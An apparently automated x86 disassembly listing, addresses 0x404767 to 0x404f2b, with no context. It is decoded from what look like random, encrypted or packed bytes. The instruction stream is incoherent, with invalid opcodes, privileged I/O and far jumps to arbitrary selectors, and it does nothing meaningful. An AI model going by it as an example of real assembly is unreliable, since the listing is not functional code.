  404767:	mov    bh,0x9c
  404769:	fsubr  DWORD PTR [esi-0x23de6e47]
  40476f:	adc    ebp,esp
  404771:	test   eax,0x61f1006b
  404776:	mov    ecx,DWORD PTR [edx-0x10]
  404779:	jb     0x40474b
  40477b:	icebp  
  40477c:	sbb    al,0x68
  40477e:	pushf  
  40477f:	pop    ebx
  404780:	inc    ecx
  404781:	sub    BYTE PTR [ecx+0x46],cl
  404784:	xor    ebx,ebx
  404786:	inc    ebp
  404787:	jbe    0x4047df
  404789:	retf   0xded2
  40478c:	sbb    al,0x89
  40478e:	outs   dx,DWORD PTR ds:[esi]
  40478f:	push   cs
  404790:	cmc    
  404791:	jne    0x404750
  404793:	lahf   
  404794:	cmp    eax,0xe3565370
  404799:	rcr    BYTE PTR [ebx-0x6bed44df],cl
  40479f:	call   0x6c99bc60
  4047a4:	push   edx
  4047a5:	push   edx
  4047a6:	jl     0x4047ee
  4047a8:	add    DWORD PTR [edi+0xacb01bf],edx
  4047ae:	out    dx,al
  4047af:	or     esp,ebx
  4047b1:	xor    bl,BYTE PTR [ecx]
  4047b3:	ins    BYTE PTR es:[edi],dx
  4047b4:	aas    
  4047b5:	pop    ss
  4047b6:	les    edx,FWORD PTR [ebp+0xf]
  4047b9:	sbb    al,0x16
  4047bb:	scas   eax,DWORD PTR es:[edi]
  4047bc:	out    dx,eax
  4047bd:	push   ss
  4047be:	hlt    
  4047bf:	xor    al,0x9
  4047c1:	inc    ecx
  4047c2:	out    0x79,al
  4047c4:	fnclex 
  4047c6:	cmp    BYTE PTR [eax],dh
  4047c8:	int3   
  4047c9:	sbb    eax,0x86a87109
  4047ce:	push   ebp
  4047cf:	and    eax,DWORD PTR [ecx+0x3e]
  4047d2:	push   cs
  4047d3:	(bad)  
  4047d4:	adc    eax,0xadcb4ba5
  4047d9:	adc    DWORD PTR [ebp+0x24105301],0xffffffa0
  4047e0:	pop    ebp
  4047e1:	pop    edx
  4047e2:	in     eax,0xf8
  4047e4:	mov    bl,0x88
  4047e6:	icebp  
  4047e7:	aas    
  4047e8:	cdq    
  4047e9:	mov    ah,0x3c
  4047eb:	in     eax,0x49
  4047ed:	neg    DWORD PTR cs:[ebx+eiz*8+0x1385f478]
  4047f5:	mov    edi,0xf26e3d11
  4047fa:	fcom   DWORD PTR [ebp-0x39]
  4047fd:	push   ds
  4047fe:	add    BYTE PTR [edx-0x619c3356],dh
  404804:	call   0x2a9d8ce5
  404809:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40480b:	xchg   ecx,edx
  40480d:	out    0x3b,al
  40480f:	jno    0x404820
  404811:	shl    BYTE PTR [ebx-0x7c],0x11
  404815:	test   DWORD PTR [esp+ebp*8-0x4d],ecx
  404819:	clc    
  40481a:	push   ebx
  40481b:	push   eax
  40481c:	push   ebx
  40481d:	add    ah,BYTE PTR [ebp-0x3e024cf9]
  404823:	or     DWORD PTR [esi-0x2792d53d],ebx
  404829:	mov    ebx,0x8d6eb9da
  40482e:	into   
  40482f:	mov    esp,0xba5cfc7b
  404834:	pop    ebp
  404835:	rcl    BYTE PTR ds:0xf66fa2f4,1
  40483b:	jb     0x404823
  40483d:	xchg   ebx,eax
  40483e:	mov    ah,0x5a
  404840:	mov    DWORD PTR [edx],edx
  404842:	adc    eax,0xb22b1f08
  404847:	ss jno 0x4047e5
  40484a:	das    
  40484b:	leave  
  40484c:	pop    ss
  40484d:	or     ch,BYTE PTR [esi+edi*2]
  404850:	xchg   DWORD PTR [edi],edi
  404852:	mov    edi,0xfbcf620d
  404857:	(bad)  
  404858:	fsub   DWORD PTR ds:0x8f9c44d1
  40485e:	(bad)  
  40485f:	jb     0x404807
  404861:	dec    eax
  404862:	test   eax,0x45521b69
  404867:	scas   al,BYTE PTR es:[edi]
  404868:	xchg   dh,al
  40486a:	xchg   ebp,eax
  40486b:	and    DWORD PTR [esi+0x242921c1],eax
  404871:	xchg   edi,eax
  404872:	xchg   ch,bl
  404874:	inc    esp
  404875:	aaa    
  404876:	add    dl,BYTE PTR [edi+0x18]
  404879:	fninit 
  40487b:	mov    bh,0xc5
  40487d:	jae    0x40486a
  40487f:	clc    
  404880:	mov    ds,WORD PTR [edx]
  404882:	pop    eax
  404883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404884:	sti    
  404885:	mov    ecx,DWORD PTR [eax+0x4e]
  404888:	cld    
  404889:	fucomip st,st(6)
  40488b:	leave  
  40488c:	daa    
  40488d:	jnp    0x40489c
  40488f:	xor    eax,0xce2ef8e3
  404894:	dec    ebx
  404895:	or     edx,DWORD PTR [ebx]
  404897:	sub    ah,BYTE PTR [ebx]
  404899:	xchg   ebp,eax
  40489a:	mov    ah,0xda
  40489c:	adc    eax,0x1b9d11e0
  4048a1:	loop   0x404864
  4048a3:	ss pop edx
  4048a5:	adc    DWORD PTR [ebp+0x5418707e],esp
  4048ab:	sbb    al,0xc5
  4048ad:	xor    cl,bh
  4048af:	test   al,0xc7
  4048b1:	lods   eax,DWORD PTR ds:[esi]
  4048b2:	pop    eax
  4048b3:	cmp    al,0x73
  4048b5:	sahf   
  4048b6:	xchg   esp,eax
  4048b7:	test   cl,dl
  4048b9:	shl    DWORD PTR [esi+0x7ea63e6],1
  4048bf:	shl    esp,1
  4048c1:	fld    TBYTE PTR [edi+0x28973401]
  4048c7:	xchg   edx,eax
  4048c8:	in     al,dx
  4048c9:	xor    DWORD PTR ds:0x3797abd,ecx
  4048cf:	(bad)  
  4048d0:	mov    ds:0xed3a9f3c,al
  4048d5:	sbb    eax,0x68ca719f
  4048da:	or     DWORD PTR [edi+0x5ae90dda],esi
  4048e0:	lds    edi,FWORD PTR [edx+0x2ee77a83]
  4048e6:	fistp  QWORD PTR [eax-0x62]
  4048e9:	xchg   ebx,eax
  4048ea:	xchg   ebp,eax
  4048eb:	dec    edx
  4048ec:	call   0x395d:0xb9db53b1
  4048f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f4:	mov    ecx,0x28e4f3bc
  4048f9:	pushf  
  4048fa:	js     0x404898
  4048fc:	outs   dx,DWORD PTR ds:[esi]
  4048fd:	pop    ecx
  4048fe:	push   esp
  4048ff:	scas   al,BYTE PTR es:[edi]
  404900:	out    dx,al
  404901:	add    edx,DWORD PTR [ebx-0x76]
  404904:	ins    BYTE PTR es:[edi],dx
  404905:	sub    BYTE PTR [ebx+edx*2+0x2d],0x3f
  40490a:	and    BYTE PTR [ecx+ebp*4+0x24],cl
  40490e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490f:	inc    DWORD PTR [esi]
  404911:	cmp    al,0xb5
  404913:	xlat   BYTE PTR ds:[ebx]
  404914:	mov    eax,ds:0xf505dccd
  404919:	fild   WORD PTR [ebp+0x72d441b7]
  40491f:	and    eax,0xa1c7d9bd
  404924:	sti    
  404925:	in     eax,0xde
  404927:	ds push eax
  404929:	in     al,0x31
  40492b:	xor    eax,0x6034895b
  404930:	mov    esi,0xd16cbcd6
  404935:	mov    bl,0x33
  404937:	xor    al,0x31
  404939:	add    eax,DWORD PTR [edx]
  40493b:	cld    
  40493c:	sbb    eax,0x36123909
  404941:	pop    edx
  404942:	push   es
  404943:	scas   eax,DWORD PTR es:[edi]
  404944:	nop
  404945:	jl     0x404904
  404947:	pop    eax
  404948:	test   eax,0x4ee1d146
  40494d:	pusha  
  40494e:	inc    esi
  40494f:	pop    es
  404950:	sub    ecx,esi
  404952:	push   esi
  404953:	mov    al,0x86
  404955:	clc    
  404956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404957:	rcl    DWORD PTR [edi+0x33],0x87
  40495b:	cmp    DWORD PTR [ebx+ebx*8-0x69fd5bc9],esp
  404962:	test   DWORD PTR [ebx-0x3d],0x669b5cbc
  404969:	les    esp,FWORD PTR [edx+0x35]
  40496c:	sub    BYTE PTR [ebx+edx*1-0x1c],cl
  404970:	lods   eax,DWORD PTR ds:[esi]
  404971:	xor    eax,0xc13ed6e1
  404976:	sub    al,BYTE PTR [edi]
  404978:	ret    0x1693
  40497b:	ds popf 
  40497d:	push   esp
  40497e:	mov    ch,0xfd
  404980:	jp     0x4049c0
  404982:	mov    esi,0x33061d9e
  404987:	mov    cl,0x34
  404989:	adc    ebp,DWORD PTR [edx+edx*8]
  40498c:	adc    BYTE PTR [ecx-0x1c2723e0],bl
  404992:	stos   BYTE PTR es:[edi],al
  404993:	arpl   WORD PTR [edx],si
  404995:	jge    0x404a09
  404997:	dec    ecx
  404998:	imul   edx,DWORD PTR [ecx],0xd55ec12b
  40499e:	inc    ebp
  40499f:	mov    BYTE PTR [edx+0x2b3c84fc],dl
  4049a5:	aas    
  4049a6:	pusha  
  4049a7:	cli    
  4049a8:	adc    eax,0x7aa8608d
  4049ad:	cli    
  4049ae:	pop    ecx
  4049af:	add    BYTE PTR [ebp-0x30],0x14
  4049b3:	push   es
  4049b4:	daa    
  4049b5:	adc    DWORD PTR [edi+ecx*8-0x189bed97],esi
  4049bc:	loope  0x404962
  4049be:	xchg   ebx,eax
  4049bf:	loop   0x40495e
  4049c1:	add    esp,DWORD PTR [edi-0x1b]
  4049c4:	jae    0x40495e
  4049c6:	xor    DWORD PTR [edi-0x42774cb7],eax
  4049cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049cd:	icebp  
  4049ce:	adc    al,0xd1
  4049d0:	push   0xffffff90
  4049d2:	mov    ah,0x8
  4049d4:	jle    0x4049f9
  4049d6:	jmp    0x404a2c
  4049d8:	in     al,0xf1
  4049da:	mov    al,0x57
  4049dc:	das    
  4049dd:	mov    ebx,0x7e066a6b
  4049e2:	call   0xb8b95882
  4049e7:	cmp    bh,dh
  4049e9:	mov    eax,0xfb1d55c3
  4049ee:	aas    
  4049ef:	in     al,0x38
  4049f1:	popa   
  4049f2:	sbb    bh,bh
  4049f4:	push   0xdd76a365
  4049f9:	and    ebp,edi
  4049fb:	ret    
  4049fc:	addr16 push ds
  4049fe:	mov    esi,0xbb5ea254
  404a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a04:	xchg   ebp,eax
  404a05:	adc    eax,0xe56b4bb0
  404a0a:	pop    ss
  404a0b:	adc    DWORD PTR [esi],esi
  404a0d:	int3   
  404a0e:	test   al,0xf1
  404a10:	into   
  404a11:	loop   0x4049e1
  404a13:	mov    eax,esp
  404a15:	lods   eax,DWORD PTR ds:[esi]
  404a16:	enter  0x2e88,0x9e
  404a1a:	inc    ecx
  404a1b:	jl     0x4049d3
  404a1d:	iret   
  404a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a1f:	iret   
  404a20:	push   ecx
  404a21:	mov    bh,0xc2
  404a23:	mov    eax,0x60f2e021
  404a28:	ror    ecx,cl
  404a2a:	test   BYTE PTR [edx-0x7f],dh
  404a2d:	xchg   eax,ebx
  404a2f:	ins    BYTE PTR es:[edi],dx
  404a30:	cmp    ebx,DWORD PTR [edx+0xb]
  404a33:	popa   
  404a34:	ret    
  404a35:	push   ebx
  404a36:	sub    al,0x8a
  404a38:	mov    ?,WORD PTR [edx]
  404a3a:	adc    DWORD PTR [esi],edx
  404a3c:	sub    bl,BYTE PTR [esi]
  404a3e:	div    DWORD PTR [ebx]
  404a40:	ret    
  404a41:	sbb    bh,BYTE PTR [ebx+0x25]
  404a44:	adc    DWORD PTR [ebx+0x34],edx
  404a47:	call   0x5233091
  404a4c:	inc    eax
  404a4d:	xchg   esi,eax
  404a4e:	(bad)  
  404a4f:	fnstsw WORD PTR [esi+0x31]
  404a52:	pop    esi
  404a53:	adc    al,0x31
  404a55:	aam    0xdf
  404a57:	jmp    0xe990:0xc0b5f0fc
  404a5e:	into   
  404a5f:	mov    ecx,0x65f0d983
  404a64:	sahf   
  404a65:	aad    0xfe
  404a67:	(bad)  
  404a68:	jp     0x404a7e
  404a6a:	data16 fdivrp st(0),st
  404a6d:	mov    eax,ds:0x9b4e8270
  404a72:	inc    eax
  404a73:	or     ch,BYTE PTR [edi-0x6e]
  404a76:	cli    
  404a77:	mov    al,ds:0x14c2d53
  404a7c:	cmp    al,0xda
  404a7e:	out    dx,eax
  404a7f:	rcr    DWORD PTR [ebx+0x44e677cf],0x4b
  404a86:	cmp    DWORD PTR [ebx+0x23],ebx
  404a89:	xsaves [ecx]
  404a8c:	cmp    DWORD PTR [ebx],edx
  404a8e:	mov    edi,?
  404a90:	jmp    0x404aa4
  404a92:	pusha  
  404a93:	xchg   esp,eax
  404a94:	push   0xfffffff1
  404a96:	pop    ebx
  404a97:	jo     0x404ab7
  404a99:	mov    fs,ebp
  404a9b:	pop    esp
  404a9c:	adc    DWORD PTR [eax],esi
  404a9e:	xlat   BYTE PTR ds:[ebx]
  404a9f:	or     ebx,DWORD PTR [ecx+eiz*8-0x23]
  404aa3:	adc    esp,ecx
  404aa5:	lea    ebx,[esi-0x25c3b79c]
  404aab:	jg     0x404a43
  404aad:	mov    al,0x5f
  404aaf:	cmp    al,0x94
  404ab1:	inc    ebx
  404ab2:	dec    edi
  404ab3:	lods   eax,DWORD PTR ds:[esi]
  404ab4:	mov    bh,0x6e
  404ab6:	pop    ebx
  404ab7:	mov    dh,0x5b
  404ab9:	test   eax,0x210942ab
  404abe:	push   0xffffff90
  404ac0:	sti    
  404ac1:	pop    ebp
  404ac2:	(bad)
  404ac6:	iret   
  404ac7:	ins    DWORD PTR es:[edi],dx
  404ac8:	inc    ebp
  404aca:	mov    al,ds:0x3c746e6b
  404acf:	xor    DWORD PTR [edx+0xe],ebp
  404ad2:	push   cs
  404ad3:	add    al,0x91
  404ad5:	sbb    BYTE PTR [eax],al
  404ad7:	sbb    BYTE PTR [eax],0xd8
  404ada:	ins    DWORD PTR es:[edi],dx
  404adb:	ja     0x404b48
  404add:	pop    eax
  404ade:	sub    esp,ecx
  404ae0:	dec    esp
  404ae1:	mov    BYTE PTR [ecx-0x7e],dl
  404ae4:	pop    ds
  404ae5:	xor    BYTE PTR [ebp-0x29c80bbb],ah
  404aeb:	les    ebp,FWORD PTR [ecx]
  404aed:	push   esi
  404aee:	pop    edi
  404aef:	sar    BYTE PTR [ebp+0x3b2c983b],cl
  404af5:	mov    esp,0xf3aee87
  404afa:	arpl   WORD PTR [edx-0x6c413a48],si
  404b00:	loopne 0x404b78
  404b02:	cs mov ah,0xd7
  404b05:	gs popf 
  404b07:	mul    esi
  404b09:	pop    ecx
  404b0a:	sbb    BYTE PTR [esi-0x2c679da3],bl
  404b10:	sub    eax,0x189a776f
  404b15:	int    0xf1
  404b17:	cmp    ecx,eax
  404b19:	jle    0x404b8d
  404b1b:	outs   dx,DWORD PTR ds:[esi]
  404b1c:	and    al,0x66
  404b1e:	xchg   BYTE PTR [ebx+0x78c7c6b6],ch
  404b24:	das    
  404b25:	(bad)  
  404b26:	mov    eax,ds:0xb2bf17e0
  404b2b:	(bad)  
  404b2c:	dec    edx
  404b2d:	add    ah,bh
  404b2f:	fs mov al,0xae
  404b32:	(bad)  
  404b34:	xor    esp,ebx
  404b36:	test   esp,ecx
  404b38:	mov    bh,0xf8
  404b3a:	sbb    al,0x9d
  404b3c:	add    eax,0x6c2ba1c4
  404b41:	test   BYTE PTR [ebx-0x1489d603],cl
  404b47:	pop    es
  404b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b49:	and    eax,0x4e8fbde3
  404b4e:	add    ah,dh
  404b50:	int    0x92
  404b52:	jle    0x404ba4
  404b54:	lea    eax,ds:0x150c2e39
  404b5a:	and    ecx,DWORD PTR [ecx]
  404b5c:	add    ebx,DWORD PTR [edi-0x37b972d8]
  404b62:	fistp  WORD PTR [ebx+0x21]
  404b65:	sbb    DWORD PTR ds:[ebx+0xe],esp
  404b69:	xchg   esp,eax
  404b6a:	mov    ch,bl
  404b6c:	mov    esi,0xc41ee520
  404b71:	push   eax
  404b72:	sbb    dl,BYTE PTR [edx-0x35]
  404b75:	or     eax,0x76208b6d
  404b7a:	sbb    al,0x92
  404b7c:	sub    al,0xd3
  404b7e:	cmp    eax,0x2e2554c0
  404b83:	fs hlt 
  404b85:	pop    eax
  404b86:	and    ebp,DWORD PTR [ecx+0x5457a29]
  404b8c:	add    ebx,DWORD PTR [edx]
  404b8e:	cli    
  404b8f:	pop    ebp
  404b90:	pop    es
  404b91:	pop    ecx
  404b92:	imul   esp,esi,0x3b
  404b95:	cmp    DWORD PTR [edi+0x5aa5faf],esi
  404b9b:	pop    ds
  404b9c:	jno    0x404b7b
  404b9e:	add    cl,BYTE PTR [esi]
  404ba0:	inc    edx
  404ba1:	xchg   DWORD PTR [esi],esp
  404ba3:	(bad)  [edi+esi*1+0x33]
  404ba7:	jne    0x404bbe
  404ba9:	push   0x6c0f9234
  404bae:	adc    al,0x24
  404bb0:	es xor ecx,esi
  404bb3:	jecxz  0x404b88
  404bb5:	cmc    
  404bb6:	es jnp 0x404bfc
  404bb9:	sbb    DWORD PTR [ebx+0x648dd2e],ebp
  404bbf:	sbb    DWORD PTR [ecx-0x57],edi
  404bc2:	cmc    
  404bc3:	enter  0xd83f,0xaa
  404bc7:	shl    DWORD PTR [ebp+eiz*8+0x73],0xa6
  404bcc:	adc    BYTE PTR [esi-0x4],al
  404bcf:	mov    edi,0x929f127c
  404bd4:	and    edx,DWORD PTR [esi]
  404bd6:	mov    ds:0x18cc26bd,al
  404bdb:	dec    edx
  404bdc:	popf   
  404bdd:	mov    dh,BYTE PTR [ecx+eax*8-0x49]
  404be1:	sbb    ebp,DWORD PTR gs:[edx+0x2ddf1e9a]
  404be8:	jp     0x404ba0
  404bea:	retf   
  404beb:	mov    bh,0x9f
  404bed:	mov    esp,0x47f888b6
  404bf2:	lahf   
  404bf3:	scas   eax,DWORD PTR es:[edi]
  404bf4:	jmp    0x89d4:0x7c9bca5f
  404bfb:	mov    edi,0xe8610002
  404c00:	cs and eax,0xa2fc74df
  404c07:	or     al,0xe7
  404c09:	(bad)  
  404c0a:	pushf  
  404c0b:	pop    ebx
  404c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0d:	cmp    eax,DWORD PTR [edi+0x6b]
  404c10:	call   0xf3b7e40f
  404c15:	stc    
  404c16:	ss jns 0x404bf6
  404c19:	stos   BYTE PTR es:[edi],al
  404c1a:	cmp    DWORD PTR [ebx-0x64524a21],esp
  404c20:	or     ebp,DWORD PTR ds:0xaae9318
  404c26:	sbb    BYTE PTR [ebp+eiz*4+0x1aafe4cc],0x17
  404c2e:	lock fisubr DWORD PTR [edi-0x31e51a04]
  404c35:	mov    al,0x5b
  404c37:	mov    DWORD PTR [edx],ecx
  404c39:	mov    edx,0x91922969
  404c3e:	call   0x768f:0x307d863d
  404c45:	ss add esi,ebx
  404c48:	push   esp
  404c49:	arpl   WORD PTR [ecx+0x9],bp
  404c4c:	enter  0x9f0d,0xdb
  404c50:	sub    DWORD PTR [eax],ebx
  404c52:	jp     0x404c03
  404c54:	add    al,0x84
  404c56:	rcr    BYTE PTR [esi+0xbb30945],cl
  404c5c:	ja     0x404c29
  404c5e:	mov    bl,0x22
  404c60:	xor    eax,0x5d98502b
  404c65:	fsub   st,st(7)
  404c67:	pushf  
  404c68:	pop    ecx
  404c69:	and    ecx,DWORD PTR [ebx]
  404c6b:	les    edx,FWORD PTR [ebx-0x590b0539]
  404c71:	fcomp  DWORD PTR [esi+eax*4]
  404c74:	lock leave 
  404c76:	jle    0x404c19
  404c78:	das    
  404c79:	stos   DWORD PTR es:[edi],eax
  404c7a:	xchg   esi,eax
  404c7b:	xchg   edx,eax
  404c7c:	arpl   WORD PTR [ecx+0x57017a9],bx
  404c82:	ficom  DWORD PTR [esi-0xbd06593]
  404c88:	ret    
  404c89:	lahf   
  404c8a:	push   esp
  404c8b:	je     0x404cb7
  404c8d:	fist   WORD PTR [ebx-0x42e8319c]
  404c93:	call   0xc230:0x556999a1
  404c9a:	inc    esp
  404c9b:	aas    
  404c9c:	retf   0xa5ef
  404c9f:	rol    DWORD PTR [ebx+0x33a45239],0x0
  404ca6:	add    DWORD PTR [esi-0x3bde72a9],ebp
  404cac:	mov    ecx,0x8b58f85
  404cb1:	call   0x51d1:0xac43ecd
  404cb8:	push   cs
  404cb9:	retf   
  404cba:	sbb    esi,DWORD PTR [ebp-0x1fee299c]
  404cc0:	adc    eax,0x4d9cefe2
  404cc5:	or     BYTE PTR [ecx+0x2d8879e1],cl
  404ccb:	sub    edx,edi
  404ccd:	dec    ebp
  404cce:	sub    eax,0x765885a5
  404cd3:	xchg   ebp,eax
  404cd4:	pop    ds
  404cd5:	jmp    0x404cc3
  404cd7:	int    0x39
  404cd9:	cmp    edi,DWORD PTR [ebp+0x21a07100]
  404cdf:	or     BYTE PTR [ecx*8-0x435b9d18],ah
  404ce6:	xor    edi,DWORD PTR [eax-0x34670167]
  404cec:	cs in  al,0x6c
  404cef:	push   0x60071867
  404cf4:	out    dx,al
  404cf5:	sbb    BYTE PTR [esi-0x19bd528],cl
  404cfb:	jb     0x404c95
  404cfd:	pop    esp
  404cfe:	push   edi
  404cff:	dec    ebp
  404d00:	hlt    
  404d01:	(bad)  
  404d02:	sahf   
  404d03:	jmp    0xbdd7:0xc4096cde
  404d0a:	addr16 jns 0x404d89
  404d0d:	inc    esi
  404d0e:	adc    DWORD PTR [ebx-0x23],edx
  404d11:	out    0xcf,al
  404d13:	pop    eax
  404d14:	stos   DWORD PTR es:[edi],eax
  404d15:	adc    al,0x61
  404d17:	lods   al,BYTE PTR ds:[esi]
  404d18:	adc    eax,DWORD PTR [ebp+0x6d]
  404d1b:	dec    esp
  404d1c:	jne    0x404d7a
  404d1e:	xor    DWORD PTR [ebp+0x61],ebx
  404d21:	xchg   ebx,eax
  404d22:	xchg   ecx,eax
  404d23:	std    
  404d24:	jge    0x404d34
  404d26:	adc    dh,BYTE PTR [ecx-0x78]
  404d29:	xor    eax,0xe4e28fa
  404d2e:	int    0xef
  404d30:	mov    cl,0x3d
  404d32:	ror    DWORD PTR ss:[edi],cl
  404d35:	push   esi
  404d36:	pop    edi
  404d37:	call   0x615e:0x6aa26aff
  404d3e:	shl    DWORD PTR [edi+ebx*8-0x8],0xdb
  404d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d44:	out    dx,eax
  404d45:	js     0x404d1a
  404d47:	das    
  404d48:	pop    ebp
  404d49:	sbb    BYTE PTR [edx+0x4cf510c3],al
  404d4f:	les    eax,FWORD PTR [edx-0x51]
  404d52:	jo     0x404cfa
  404d54:	pop    esp
  404d55:	add    ecx,0xffffff9a
  404d58:	jecxz  0x404d5c
  404d5a:	mov    bl,0x64
  404d5c:	sbb    ch,BYTE PTR [ebp-0x1a69154f]
  404d62:	mul    DWORD PTR [esi-0x67]
  404d65:	dec    esi
  404d66:	scas   eax,DWORD PTR es:[edi]
  404d67:	cmp    al,BYTE PTR [eax+ecx*1]
  404d6a:	add    BYTE PTR [eax+0x18617f19],bl
  404d70:	js     0x404dbe
  404d72:	daa    
  404d73:	iret   
  404d74:	int3   
  404d75:	sub    ah,BYTE PTR [eax+0x39722d12]
  404d7b:	rol    bl,1
  404d7d:	or     al,0x47
  404d7f:	xor    edi,DWORD PTR [ecx+0x53]
  404d82:	jp     0x404d32
  404d84:	aas    
  404d85:	pop    esi
  404d86:	inc    esp
  404d87:	iret   
  404d88:	inc    ecx
  404d89:	push   esi
  404d8a:	xchg   ecx,eax
  404d8b:	pop    ebp
  404d8c:	adc    dl,BYTE PTR [eax-0x5791df14]
  404d92:	mov    ?,WORD PTR [eax]
  404d94:	or     ebp,DWORD PTR [eax-0x1b]
  404d97:	les    esp,FWORD PTR [ebp+esi*4-0x7a]
  404d9b:	jmp    0x86ce:0xec3c8792
  404da2:	mov    ds:0xac0d1ea5,eax
  404da7:	add    al,0x41
  404da9:	mov    ah,BYTE PTR ds:0xc805fb95
  404daf:	jl     0x404d50
  404db1:	inc    edi
  404db2:	test   al,0x2d
  404db4:	mov    edi,0x97b2da7d
  404db9:	(bad)  
  404dba:	in     eax,dx
  404dbb:	das    
  404dbc:	and    dl,BYTE PTR [edx-0x5e]
  404dbf:	frstor [edi+0x726ed267]
  404dc5:	xchg   ecx,eax
  404dc6:	mov    ebp,0xfa0aa42e
  404dcb:	or     esp,DWORD PTR [eax+0x344eb312]
  404dd1:	mov    bh,0xb0
  404dd3:	jmp    DWORD PTR [esi+0x2]
  404dd6:	ja     0x404e14
  404dd8:	sbb    DWORD PTR [ebx-0x20],esi
  404ddb:	inc    esi
  404ddc:	cld    
  404ddd:	daa    
  404dde:	jne    0x404e5d
  404de0:	push   esi
  404de1:	jne    0x404dce
  404de3:	adc    eax,0x25ab1f7e
  404de8:	mov    edi,0xb564bb57
  404ded:	lahf   
  404dee:	test   BYTE PTR [esi-0x1b07b5ca],0xee
  404df5:	mov    WORD PTR [ecx-0x2b12286f],ss
  404dfb:	pop    ss
  404dfc:	dec    edx
  404dfd:	cmp    al,0x5
  404dff:	pushf  
  404e00:	jmp    0xf275:0x6f6bacc3
  404e07:	xor    al,0x41
  404e09:	inc    ebp
  404e0a:	pop    ds
  404e0b:	fild   QWORD PTR [ebx]
  404e0d:	sub    DWORD PTR [esp+ebx*4],0x7c
  404e11:	imul   ebp
  404e13:	call   0x216949ff
  404e18:	dec    si
  404e1a:	sub    BYTE PTR [eax],dh
  404e1c:	cld    
  404e1d:	loope  0x404dde
  404e1f:	jbe    0x404e77
  404e21:	or     al,0x9c
  404e23:	int3   
  404e24:	pop    ds
  404e25:	pushf  
  404e26:	adc    BYTE PTR [eax-0x6c],dl
  404e29:	out    dx,eax
  404e2a:	and    DWORD PTR [ebx-0x8],eax
  404e2d:	ds jp  0x404e67
  404e30:	jl     0x404e32
  404e32:	mov    eax,ebx
  404e34:	sti    
  404e35:	inc    edx
  404e36:	or     bh,bh
  404e38:	mov    WORD PTR [ebx+0x30a4cea5],ss
  404e3e:	cs xchg ebp,eax
  404e40:	xlat   BYTE PTR ds:[ebx]
  404e41:	push   cs
  404e42:	mov    ds:0x1fdb2c13,al
  404e47:	sub    bl,bh
  404e49:	out    0x1f,al
  404e4b:	push   ecx
  404e4c:	into   
  404e4d:	je     0x404e07
  404e4f:	loope  0x404e49
  404e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e52:	or     al,0x9e
  404e54:	mov    ch,0x63
  404e56:	(bad)  
  404e58:	jns    0x404e62
  404e5a:	and    DWORD PTR [esi-0x16a0818e],0xfffffff1
  404e61:	loop   0x404eb1
  404e63:	jle    0x404e44
  404e65:	push   eax
  404e66:	leave  
  404e67:	jne    0x404ea7
  404e69:	cmp    ebp,DWORD PTR [edx+eiz*2+0x297036ba]
  404e70:	pop    ds
  404e71:	jbe    0x404e88
  404e73:	mov    ecx,0x22a5af3e
  404e78:	mov    ds:0x79391acd,eax
  404e7d:	adc    ecx,edx
  404e7f:	lods   eax,DWORD PTR ds:[esi]
  404e80:	fld    QWORD PTR [ebp-0x3b]
  404e83:	lahf   
  404e84:	push   es
  404e85:	push   ecx
  404e86:	js     0x404ef6
  404e88:	jae    0x404ef1
  404e8a:	imul   BYTE PTR [edx]
  404e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e8d:	adc    al,0x40
  404e8f:	cmp    eax,DWORD PTR [esp+edi*4]
  404e92:	cdq    
  404e93:	ss mov bh,0x21
  404e96:	stos   BYTE PTR es:[edi],al
  404e97:	mov    esp,0xc7d6e9e6
  404e9c:	mov    al,0x82
  404e9e:	enterw 0x5ef2,0xea
  404ea3:	mov    cl,0x91
  404ea5:	jne    0x404ebb
  404ea7:	je     0x404e3e
  404ea9:	xlat   BYTE PTR ds:[ebx]
  404eaa:	push   ebx
  404eab:	loop   0x404ef1
  404ead:	iret   
  404eae:	push   cs
  404eaf:	pop    ebx
  404eb0:	test   al,0x82
  404eb2:	dec    ebx
  404eb3:	loop   0x404e9d
  404eb5:	fwait
  404eb6:	out    0x10,al
  404eb8:	test   ebx,esp
  404eba:	jg     0x404e53
  404ebc:	call   0x3975:0xdc719e27
  404ec3:	fld    TBYTE PTR [eax]
  404ec6:	mov    ebx,ebp
  404ec8:	rcr    DWORD PTR [ecx+0x27202320],0x6e
  404ecf:	imul   esp,DWORD PTR [edx],0x74
  404ed2:	int    0xd0
  404ed4:	jb     0x404e7c
  404ed6:	retf   
  404ed7:	fucomip st,st(3)
  404ed9:	mov    ecx,DWORD PTR [ebx+ecx*8-0x7f910dc]
  404ee0:	inc    esp
  404ee1:	jo     0x404edc
  404ee3:	add    esi,esi
  404ee5:	adc    eax,0xd5b5b9eb
  404eea:	ret    0xcbe1
  404eed:	pushf  
  404eee:	add    ecx,DWORD PTR [ecx+0x69]
  404ef1:	outs   dx,DWORD PTR ds:[esi]
  404ef2:	fdivr  QWORD PTR [edi+0x1f]
  404ef5:	dec    eax
  404ef6:	push   ds
  404ef7:	ficomp DWORD PTR [edi]
  404ef9:	mov    edx,0x170fae53
  404efe:	shr    DWORD PTR [ecx],0x84
  404f01:	addr16 call 0x6efb3d00
  404f07:	loopne 0x404f5f
  404f09:	add    eax,0xbc67f46e
  404f0e:	xchg   ecx,eax
  404f0f:	xor    eax,0xffffffb3
  404f12:	in     eax,dx
  404f13:	jno    0x404f4d
  404f15:	repnz or esp,DWORD PTR [edx+ebx*8-0x6f]
  404f1a:	scas   al,BYTE PTR es:[edi]
  404f1b:	add    eax,0x1ee18e3d
  404f20:	push   edx
  404f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f22:	jge    0x404f98
  404f24:	sub    ah,ch
  404f26:	iret   
  404f27:	sti    
  404f28:	dec    edx
  404f29:	mov    ch,0xc8
  404f2b:	ss in  eax,dx
